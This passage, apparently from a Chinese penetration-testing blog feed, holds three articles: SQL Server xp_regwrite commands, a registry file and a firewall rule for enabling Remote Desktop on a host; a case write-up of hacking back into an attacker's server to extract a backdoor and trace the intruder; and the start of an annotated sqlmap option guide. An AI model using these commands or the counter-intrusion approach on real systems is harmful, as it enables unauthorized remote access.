        <content type="html"><![CDATA[<h1 id="SqlServer-常用操作远程桌面语句"><a href="#SqlServer-常用操作远程桌面语句" class="headerlink" title="SqlServer 常用操作远程桌面语句"></a>SqlServer 常用操作远程桌面语句</h1><h3 id="1、是否开启远程桌面"><a href="#1、是否开启远程桌面" class="headerlink" title="1、是否开启远程桌面"></a>1、是否开启远程桌面</h3><ul><li>1：表示关闭</li><li>0：表示开启<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',</span><br><span class="line">'SYSTEM\CurrentControlSet\Control\Terminal Server',</span><br><span class="line">'fDenyTSConnections'</span><br></pre></td></tr></table></figure></li></ul><p><img src="../do/media/f01ea9712b6f116b14c9b9e75b7d49cd.jpg" alt></p><h3 id="2、读取远程桌面端口"><a href="#2、读取远程桌面端口" class="headerlink" title="2、读取远程桌面端口"></a>2、读取远程桌面端口</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',</span><br><span class="line">'SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp',</span><br><span class="line">'PortNumber'</span><br><span class="line">```  </span><br><span class="line">![](../<span class="keyword">do</span>/media/<span class="number">061010</span>d0371ed380f50bbb96911c6d80.jpg)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 3、开启远程桌面</span></span><br><span class="line"><span class="string">``</span><span class="string">`sql</span></span><br><span class="line"><span class="string">EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE',</span></span><br><span class="line"><span class="string">'SYSTEM\CurrentControlSet\Control\TerminalServer',</span></span><br><span class="line"><span class="string">'fDenyTSConnections','REG_DWORD',0;</span></span><br></pre></td></tr></table></figure><p><strong>reg 文件开启远程桌面：</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer]</span><br><span class="line">"fDenyTSConnections"=dword:00000000[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp]</span><br><span class="line">"PortNumber"=dword:00000d3d</span><br></pre></td></tr></table></figure><p>////<br>保存 micropoor.reg，并执行 regedit /s micropoor.reg</p><p><strong>注：如果第一次开启远程桌面，部分需要配置防火墙规则允许远程端口。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP</span><br><span class="line">dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><h3 id="4、关闭远程桌面"><a href="#4、关闭远程桌面" class="headerlink" title="4、关闭远程桌面"></a>4、关闭远程桌面</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE',</span><br><span class="line">'SYSTEM\CurrentControlSet\Control\TerminalServer',</span><br><span class="line">'fDenyTSConnections','REG_DWORD',1;</span><br></pre></td></tr></table></figure><p align="right">--By  Micropoor </p>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>6、反攻的一次溯源--项目实战3</title>
      <link href="/article/6_%E5%8F%8D%E6%94%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BA%AF%E6%BA%90--%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%983.html"/>
      <url>/article/6_%E5%8F%8D%E6%94%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BA%AF%E6%BA%90--%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%983.html</url>
      
        <content type="html"><![CDATA[<h2 id="事件过程"><a href="#事件过程" class="headerlink" title="事件过程"></a>事件过程</h2><p>某厂商通过日志分析发现可疑 IP，但是日志记录里显示该 IP 的行为是频繁地登陆内网，并无发现有攻击的迹象，因此无法下手进行内网安全的加固和清除后门。而且显示的是外国 IP，无法确定是真实 IP 还是代理 IP，因此无法定位攻击者的地理位置。<br><strong>思路：</strong><br>反入侵得到攻击者机器权限 -&gt; 入侵现场还原，摸清入侵思路 -&gt; 并且须知入侵者的相关后门遗留，以便处理后门 -&gt; 抓取入侵者的真实IP获得地理位置 -&gt; 并按照攻击者的攻击路线加固相关漏洞安全。</p><h3 id="一、日志分析"><a href="#一、日志分析" class="headerlink" title="一、日志分析"></a>一、日志分析</h3><ol><li>某厂商日志：该IP 为韩国，login 状态全部为success<br><img src="../do/media/94c1beb0a701ac44fb49e0a422ffd944.jpg" alt><br><img src="../do/media/2721e594c24138dafca79457f1429020.jpg" alt><br>221-ip 成功，进入内网多个IP。但无其他记录，如过程，手法。无法安全加固客户内网。无法分析出哪里出现问题，只能找出起始被入侵成功的IP，需要得到攻击者的电脑权限，还原攻击过程，才可得知被攻击者的弱点并加固。<br><img src="../do/media/3827dc9bd212de72570f8783f0d48057.jpg" alt>  </li></ol><p><img src="../do/media/22dfadf43c1c8d5e87b529792ccf2e8f.jpg" alt></p><p>在tns日志中，oracle相关存储得到入侵者相关的存储利用。如 downfile‐smss.exe,地址为 115.231.60.76。</p><ul><li>此时，我们得到2个攻击者IP，1个样本</li><li>IP分别为韩国，河南，样本1为：smss.exe</li></ul><h3 id="二、现场还原"><a href="#二、现场还原" class="headerlink" title="二、现场还原"></a>二、现场还原</h3><ol><li>刺探攻击者的服务器相关信息：<br>起初连接到入侵者IP的服务器，IP归属地为韩国，并且服务器也为韩文，非中国渠道购买，起初以为攻击者为国外人员。<br><img src="../do/media/2b774af3d64d77145ca10d8ba2a93d7f.jpg" alt><br><img src="../do/media/0b66228d57ad2d5d51b3edc6527646a6.jpg" alt>  </li></ol><p>但当刺探攻击者服务器21端口时发现并非真正的“国外黑客”<br><img src="../do/media/8f7e7a3a538dde2dae4bbbb31b58a7b2.jpg" alt></p><p>于是，暂时定为攻击者为国内，需要摸查的IP锁定为中国范围内IP<br><strong>整体思路临时改为：</strong> 需要得到该服务器的权限，查看所有登陆成功日志，找出IP以及对应时间。<br><strong>入侵思路临时改为：</strong>该服务器为懂攻防人员所拥有，尽可能在该服务器不添加任何账号或留有明显痕迹。<br><img src="../do/media/6329737942f4c65b7c4e7e789f5e2d66.jpg" alt></p><p>由于韩国服务器此段有DHCP记录查看应用，该应用存在loadfile漏洞，并且得知目标服务器存在 shift 后门。</p><p>  攻击思路为：16进制读取 shift 后门，并unhex本地还原exe，得到样本2，本地分析该样本，从而不留痕迹得得到攻击者服务器。  </p><p>  至此：目前我们得到2个攻击者IP，2个样本，IP分别为韩国，河南，样本分别为smss.exe与sethc.exe。</p><h3 id="三、本地样本分析"><a href="#三、本地样本分析" class="headerlink" title="三、本地样本分析"></a>三、本地样本分析</h3><p>样本1：生成替换dll。并且自启动，反链接到某IP的8080端口，并且自删除。为远控特征。</p><p>远控样本md5值：<br><img src="../do/media/d3b31f3a54fdb6216a622a4d64d051b9.jpg" alt><br><img src="../do/media/611ab4bd340cc2fc0c604297f42d8acf.jpg" alt></p><p><img src="../do/media/3cdad13867b651eba844affe7e69d5ad.jpg" alt></p><p>样本2：shift 后门，VB编译，并且未加壳。思路为，反汇编得到样本密码以及软件工作流程。<br>Shift后门样本MD5：<br><img src="../do/media/43800ab568907b004baeec442e405f15.jpg" alt>  </p><p><img src="../do/media/60329351b198e03e5296e740116c7ffe.jpg" alt></p><p>特征为密码输入错误，呼出msgbox</p><p><img src="../do/media/3f24c1396076440235e7fbc6c95cf55e.jpg" alt></p><p><img src="../do/media/21d1c9b86a234e59dd354e95da901db5.jpg" alt></p><p><img src="../do/media/d20c0ea214162b960aa1dc6d36a08135.jpg" alt></p><p>得到该程序相关工作流程，当输入密码正确时，调出taskmgr.exe（任务管理器）以及 cmd.exe</p><h3 id="四、测试并取证"><a href="#四、测试并取证" class="headerlink" title="四、测试并取证"></a>四、测试并取证</h3><ol><li><p>输入得到的密码。<br><img src="../do/media/7b161478f4ea9bf11f0e8e08924d005f.jpg" alt><br>当密码正确时呼出相关进程，并且得到system权限。<br><img src="../do/media/3c2ab7b4ff5cb533f7d0c7c9ba3fa7b7.jpg" alt>  </p></li><li><p>取证以及样本截留：</p></li></ol><p>攻击者真实IP以及对应时间：<br><img src="../do/media/93bdae33a293d798b753ad6991c80955.jpg" alt><br><img src="../do/media/f35b7aa043fe354d01542029ff5fa255.jpg" alt></p><p>得到真实入侵者的IP归属地为：四川省眉山市 电信<br>并且桌面截图：<br><img src="../do/media/b7ebd7bfc74e6d295b6bb67c258aff7b.jpg" alt></p><p>再该服务器上留有大量以地名名为的 txt 文本（如 beijing.txt）。文本内容为 IP，部分内容为账号，密码,ip。其中dongbei.txt（被攻击者归属地为东北）找到某政府对应IP。</p><p><img src="../do/media/05c7892c0be8bb3c4f245075b13b4119.jpg" alt></p><p><img src="../do/media/47af8c931ade9a7cbeeb61c4b41792f4.jpg" alt></p><p>至此通过该服务器的桌面相关软件以及相关攻击者本文记录，得知攻击者的入侵思路，以及部分后门留存位置特征等。以此回头来加固某政府内网安全以及切入点。</p><p align="right">--By  Micropoor </p>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>5、工具介绍-Sqlmap</title>
      <link href="/article/5_%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D-Sqlmap.html"/>
      <url>/article/5_%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D-Sqlmap.html</url>
      
        <content type="html"><![CDATA[<h2 id="sqlmap参数详解："><a href="#sqlmap参数详解：" class="headerlink" title="sqlmap参数详解："></a>sqlmap参数详解：</h2><p>由于Sqlmap 是常用工具之一，所以本篇的篇幅较长，详解一次所有参数。</p><h3 id="1、Options（选项）"><a href="#1、Options（选项）" class="headerlink" title="1、Options（选项）"></a>1、Options（选项）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Usage: python sqlmap.py [options]</span><br><span class="line"></span><br><span class="line">Options（选项）:</span><br><span class="line"></span><br><span class="line">-h, --help Show basic help message and exit</span><br><span class="line">## 展示帮助文档 参数</span><br><span class="line"></span><br><span class="line">-hh Show advanced help message and exit</span><br><span class="line">## 展示详细帮助文档参数</span><br><span class="line"></span><br><span class="line">--version Show program&apos;s version number and exit</span><br><span class="line">## 显示程序的版本号</span><br><span class="line"></span><br><span class="line">-v VERBOSE Verbosity level: 0-6 (default 1)</span><br><span class="line">## 详细级别：0-6（默认为1）</span><br></pre></td></tr></table></figure><h3 id="2、Target（目标）"><a href="#2、Target（目标）" class="headerlink" title="2、Target（目标）"></a>2、Target（目标）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Target（目标）:</span><br><span class="line"></span><br><span class="line">At least one of these options has to be provided to define the target(s)</span><br><span class="line"></span><br><span class="line">-d DIRECT Connection string for direct database connection</span><br><span class="line">## 指定具体数据库</span><br><span class="line"></span><br><span class="line">-u URL, --url=URL Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)</span><br><span class="line">## 目标URL</span><br><span class="line"></span><br><span class="line">-l LOGFILE Parse target(s) from Burp or WebScarab proxy log file</span><br><span class="line">## 解析目标(s)从Burp或WebScarab代理日志文件</span><br><span class="line"></span><br><span class="line">-x SITEMAPURL Parse target(s) from remote sitemap(.xml) file</span><br><span class="line">## 解析目标(s)从远程站点地图文件(.xml)</span><br><span class="line"></span><br><span class="line">-m BULKFILE Scan multiple targets given in a textual file</span><br><span class="line">## 扫描文本文件中给出的多个目标</span><br><span class="line"></span><br><span class="line">-r REQUESTFILE Load HTTP request from a file</span><br><span class="line">## 从本地文件加载HTTP请求 ，多用于post注入。</span><br><span class="line"></span><br><span class="line">-g GOOGLEDORK Process Google dork results as target URLs</span><br><span class="line">## 处理Google的结果作为目标URL。</span><br><span class="line"></span><br><span class="line">-c CONFIGFILE Load options from a configuration INI file</span><br><span class="line">## 从INI配置文件中加载选项。</span><br></pre></td></tr></table></figure><h3 id="3、Request（请求）"><a href="#3、Request（请求）" class="headerlink" title="3、Request（请求）"></a>3、Request（请求）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">Request（请求）:</span><br><span class="line"></span><br><span class="line">These options can be used to specify how to connect to the target URL</span><br><span class="line">## 这些选项可以用来指定如何连接到目标URL。</span><br><span class="line"></span><br><span class="line">--method=METHOD Force usage of given HTTP method (e.g. PUT)</span><br><span class="line">## 强制使用给定的HTTP方法（e.g. PUT）</span><br><span class="line"></span><br><span class="line">--data=DATA Data string to be sent through POST</span><br><span class="line">## 通过POST发送的数据字符串</span><br><span class="line"></span><br><span class="line">--param-del=PARA.. Character used for splitting parameter values</span><br><span class="line">## 用于拆分参数值的字符</span><br><span class="line"></span><br><span class="line">--cookie=COOKIE HTTP Cookie header value HTTP</span><br><span class="line">## Cookie头的值</span><br><span class="line"></span><br><span class="line">--cookie-del=COO.. Character used for splitting cookie values</span><br><span class="line">## 用于分割Cookie值的字符</span><br><span class="line"></span><br><span class="line">--load-cookies=L.. File containing cookies in Netscape/wget format</span><br><span class="line">## 包含Netscape / wget格式的cookie的文件</span><br><span class="line"></span><br><span class="line">--drop-set-cookie Ignore Set-Cookie header from response</span><br><span class="line">## 从响应中忽略Set-Cookie头</span><br><span class="line"></span><br><span class="line">--user-agent=AGENT HTTP User-Agent header value</span><br><span class="line">## 指定 HTTP User - Agent头</span><br><span class="line"></span><br><span class="line">--random-agent Use randomly selected HTTP User-Agent header value</span><br><span class="line">##  使用随机选定的HTTP User - Agent头</span><br><span class="line"></span><br><span class="line">--host=HOST HTTP Host header value</span><br><span class="line">## HTTP主机头值</span><br><span class="line"></span><br><span class="line">--referer=REFERER HTTP Referer header value</span><br><span class="line">##  指定 HTTP Referer头</span><br><span class="line"></span><br><span class="line">-H HEADER, --hea.. Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)</span><br><span class="line">## 额外header</span><br><span class="line"></span><br><span class="line">--headers=HEADERS Extra headers (e.g. &quot;Accept-Language: fr\\nETag: 123&quot;)</span><br><span class="line">## 额外header</span><br><span class="line"></span><br><span class="line">--auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI)HTTP</span><br><span class="line">## 认证类型(Basic, Digest, NTLM or PKI)</span><br><span class="line"></span><br><span class="line">--auth-cred=AUTH.. HTTP authentication credentials (name:password)</span><br><span class="line">##  HTTP认证凭证(name:password)</span><br><span class="line"></span><br><span class="line">--auth-file=AUTH.. HTTP authentication PEM cert/private key file</span><br><span class="line">## HTTP认证 PEM认证/私钥文件</span><br><span class="line"></span><br><span class="line">--ignore-401 Ignore HTTP Error 401 (Unauthorized)</span><br><span class="line">## 忽略HTTP错误401</span><br><span class="line"></span><br><span class="line">--proxy=PROXY Use a proxy to connect to the target URL</span><br><span class="line">## 使用代理连接到目标网址</span><br><span class="line"></span><br><span class="line">--proxy-cred=PRO.. Proxy authentication credentials (name:password)</span><br><span class="line">## 代理认证证书(name:password)</span><br><span class="line"></span><br><span class="line">--proxy-file=PRO.. Load proxy list from a file</span><br><span class="line">## 从文件中加载代理列表</span><br><span class="line"></span><br><span class="line">--ignore-proxy Ignore system default proxy settings</span><br><span class="line">## 忽略系统默认代理设置</span><br><span class="line"></span><br><span class="line">--tor Use Tor anonymity network</span><br><span class="line">## 使用Tor匿名网络</span><br><span class="line"></span><br><span class="line">--tor-port=TORPORT Set Tor proxy port other than default</span><br><span class="line">##  设置Tor代理端口而不是默认值</span><br><span class="line"></span><br><span class="line">--tor-type=TORTYPE Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)</span><br><span class="line">## 设置Tor代理类型</span><br><span class="line"></span><br><span class="line">--check-tor Check to see if Tor is used properly</span><br><span class="line">## 检查Tor是否正确使用</span><br><span class="line"></span><br><span class="line">--delay=DELAY Delay in seconds between each HTTP request</span><br><span class="line">## 每个HTTP请求之间的延迟（秒）</span><br><span class="line"></span><br><span class="line">--timeout=TIMEOUT Seconds to wait before timeout connection (default 30)</span><br><span class="line">## 秒超时连接前等待（默认30）</span><br><span class="line"></span><br><span class="line">--retries=RETRIES Retries when the connection timeouts (default 3)</span><br><span class="line">##  连接超时时重试（默认值3）</span><br><span class="line"></span><br><span class="line">--randomize=RPARAM Randomly change value for given parameter(s)</span><br><span class="line">## 随机更改给定参数的值(s)</span><br><span class="line"></span><br><span class="line">--safe-url=SAFEURL URL address to visit frequently during testing</span><br><span class="line">## 在测试期间频繁访问的URL地址</span><br><span class="line"></span><br><span class="line">--safe-post=SAFE.. POST data to send to a safe URL</span><br><span class="line">## POST数据发送到安全URL</span><br><span class="line"></span><br><span class="line">--safe-req=SAFER.. Load safe HTTP request from a file</span><br><span class="line">## 从文件加载安全HTTP请求</span><br><span class="line"></span><br><span class="line">--safe-freq=SAFE.. Test requests between two visits to a given safe URL</span><br><span class="line">## 在两次访问给定安全网址之间测试请求</span><br><span class="line"></span><br><span class="line">--skip-urlencode Skip URL encoding of payload data</span><br><span class="line">## 跳过有效载荷数据的URL编码</span><br><span class="line"></span><br><span class="line">--csrf-token=CSR.. Parameter used to hold anti-CSRF token</span><br><span class="line">## 参数用于保存anti-CSRF令牌</span><br><span class="line"></span><br><span class="line">--csrf-url=CSRFURL URL address to visit to extract anti-CSRF token</span><br><span class="line">## 提取anti-CSRF URL地址访问令牌</span><br><span class="line"></span><br><span class="line">--force-ssl Force usage of SSL/HTTPS</span><br><span class="line">## 强制使用SSL /HTTPS</span><br><span class="line"></span><br><span class="line">--hpp Use HTTP parameter pollution method</span><br><span class="line">## 使用HTTP参数pollution的方法</span><br><span class="line"></span><br><span class="line">--eval=EVALCODE Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)</span><br></pre></td></tr></table></figure><h3 id="4、Optimization（优化）"><a href="#4、Optimization（优化）" class="headerlink" title="4、Optimization（优化）"></a>4、Optimization（优化）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Optimization（优化）:</span><br><span class="line"></span><br><span class="line">These options can be used to optimize the performance of sqlmap</span><br><span class="line">## 这些选项可用于优化sqlmap的性能</span><br><span class="line"></span><br><span class="line">-o Turn on all optimization switches</span><br><span class="line">## 开启所有优化开关</span><br><span class="line"></span><br><span class="line">--predict-output Predict common queries output</span><br><span class="line">## 预测常见的查询输出</span><br><span class="line"></span><br><span class="line">--keep-alive Use persistent HTTP(s) connections</span><br><span class="line">## 使用持久的HTTP（S）连接</span><br><span class="line"></span><br><span class="line">--null-connection Retrieve page length without actual HTTP response body</span><br><span class="line">## 从没有实际的HTTP响应体中检索页面长度</span><br><span class="line"></span><br><span class="line">--threads=THREADS Max number of concurrent HTTP(s) requests (default 1)</span><br><span class="line">## 最大的HTTP（S）请求并发量（默认为1）</span><br></pre></td></tr></table></figure><h3 id="5、Injection（注入）"><a href="#5、Injection（注入）" class="headerlink" title="5、Injection（注入）"></a>5、Injection（注入）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Injection（注入）:</span><br><span class="line"></span><br><span class="line">These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts</span><br><span class="line">##  这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</span><br><span class="line"></span><br><span class="line">-p TESTPARAMETER Testable parameter(s)</span><br><span class="line">## 可测试的参数（S）</span><br><span class="line"></span><br><span class="line">--skip=SKIP Skip testing for given parameter(s)</span><br><span class="line">## 跳过对给定参数的测试</span><br><span class="line"></span><br><span class="line">--skip-static Skip testing parameters that not appear to be dynamic</span><br><span class="line">## 跳过测试不显示为动态的参数</span><br><span class="line"></span><br><span class="line">--param-exclude=.. Regexp to exclude parameters from testing (e.g. &quot;ses&quot;)</span><br><span class="line">## 使用正则表达式排除参数进行测试（e.g. &quot;ses&quot;）</span><br><span class="line"></span><br><span class="line">--dbms=DBMS Force back-end DBMS to this value</span><br><span class="line">## 强制后端的DBMS为此值</span><br><span class="line"></span><br><span class="line">--dbms-cred=DBMS.. DBMS authentication credentials (user:password)</span><br><span class="line">## DBMS认证凭证(user:password)</span><br><span class="line"></span><br><span class="line">--os=OS Force back-end DBMS operating system to this value</span><br><span class="line">## 强制后端的DBMS操作系统为这个值</span><br><span class="line"></span><br><span class="line">--invalid-bignum Use big numbers for invalidating values</span><br><span class="line">## 使用大数字使值无效</span><br><span class="line"></span><br><span class="line">--invalid-logical Use logical operations for invalidating values</span><br><span class="line">## 使用逻辑操作使值无效</span><br><span class="line"></span><br><span class="line">--invalid-string Use random strings for invalidating values</span><br><span class="line">## 使用随机字符串使值无效</span><br><span class="line"></span><br><span class="line">--no-cast Turn off payload casting mechanism</span><br><span class="line">## 关闭有效载荷铸造机制</span><br><span class="line"></span><br><span class="line">--no-escape Turn off string escaping mechanism</span><br><span class="line">## 关闭字符串转义机制</span><br><span class="line"></span><br><span class="line">--prefix=PREFIX Injection payload prefix string</span><br><span class="line">## 注入payload字符串前缀</span><br><span class="line"></span><br><span class="line">--suffix=SUFFIX Injection payload suffix string</span><br><span class="line">## 注入payload字符串后缀</span><br><span class="line"></span><br><span class="line">--tamper=TAMPER Use given script(s) for tampering injection data</span><br><span class="line">## 使用给定的脚本（S）篡改注入数据</span><br></pre></td></tr></table></figure><h3 id="6、Detection（检测）"><a href="#6、Detection（检测）" class="headerlink" title="6、Detection（检测）"></a>6、Detection（检测）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Detection（检测）:</span><br><span class="line">These options can be used to customize the detection phase</span><br><span class="line">## 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</span><br><span class="line"></span><br><span class="line">--level=LEVEL Level of tests to perform (1-5, default 1)</span><br><span class="line">## 执行测试的等级（1-5，默认为1）</span><br><span class="line"></span><br><span class="line">--risk=RISK Risk of tests to perform (1-3, default 1)</span><br><span class="line">## 执行测试的风险（0-3，默认为1）</span><br><span class="line"></span><br><span class="line">--string=STRING String to match when query is evaluated to True</span><br><span class="line">##  查询时有效时在页面匹配字符串</span><br><span class="line"></span><br><span class="line">--not-string=NOT.. String to match when query is evaluated to False</span><br><span class="line">## 当查询求值为无效时匹配的字符串</span><br><span class="line"></span><br><span class="line">--regexp=REGEXP Regexp to match when query is evaluated to True</span><br><span class="line">## 查询时有效时在页面匹配正则表达式</span><br><span class="line"></span><br><span class="line">--code=CODE HTTP code to match when query is evaluated to True</span><br><span class="line">## 当查询求值为True时匹配的HTTP代码</span><br><span class="line"></span><br><span class="line">--text-only Compare pages based only on the textual content</span><br><span class="line">## 仅基于在文本内容比较网页</span><br><span class="line"></span><br><span class="line">--titles Compare pages based only on their titles</span><br><span class="line">##  仅根据他们的标题进行比较</span><br></pre></td></tr></table></figure><h3 id="7、Techniques（技巧）"><a href="#7、Techniques（技巧）" class="headerlink" title="7、Techniques（技巧）"></a>7、Techniques（技巧）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 